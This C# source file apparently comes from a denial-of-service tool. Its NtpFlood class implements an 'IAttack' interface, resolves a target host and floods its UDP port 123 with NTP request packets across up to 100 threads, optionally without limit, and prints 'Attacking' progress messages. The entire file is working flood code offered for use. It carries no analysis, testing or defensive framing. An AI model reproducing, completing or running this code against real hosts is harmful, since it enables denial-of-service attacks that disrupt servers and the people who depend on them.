using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ConnectFlood
{
    public class NtpFlood : IAttack
    {
        private int activeThreads = 0;
        private int maxThreads = 100;

        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            target = CleanTarget(target);
            string ipAddress = ResolveTarget(target);
            if (ipAddress == null)
            {
                Console.WriteLine($"[NTP] Failed to resolve {target}");
                return;
            }

            Console.WriteLine($"[NTP] Attacking {target} ({ipAddress}):123 | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

            int count = 0;
            while (packetCount == -1 || count < packetCount)
            {
                while (activeThreads >= maxThreads)
                {
                    Thread.Sleep(10); 
                }

                Interlocked.Increment(ref activeThreads);
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        using (UdpClient udpClient = new UdpClient())
                        {
                            udpClient.Connect(ipAddress, 123);

                            byte[] ntpRequest = new byte[48];
                            ntpRequest[0] = 0x1B; 

                            udpClient.Send(ntpRequest, ntpRequest.Length);
                            Console.WriteLine($"[{count + 1}] NTP Request Sent to {ipAddress}:123");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[{count + 1}] NTP Error: {ex.Message}");
                    }
                    finally
                    {
                        Interlocked.Decrement(ref activeThreads);
                    }
                });

                count++;
                Thread.Sleep(Math.Max(speed, 10));
            }

            Console.WriteLine("[NTP] Attack Finished.");
        }

        private string ResolveTarget(string target)
        {
            try
            {
                IPAddress[] addresses = Dns.GetHostAddresses(target);
                foreach (IPAddress addr in addresses)
                {
                    if (addr.AddressFamily == AddressFamily.InterNetwork)
                    {
                        return addr.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[NTP] DNS Resolution Error: {ex.Message}");
            }
            return null;
        }

        private string CleanTarget(string target)
        {
            if (target.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
            {
                target = target.Substring(7);
            }
            else if (target.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                target = target.Substring(8);
            }
            int colonIndex = target.IndexOf(':');
            if (colonIndex > 0)
            {
                target = target.Substring(0, colonIndex);
            }

            return target.TrimEnd('/');
        }

    }
}
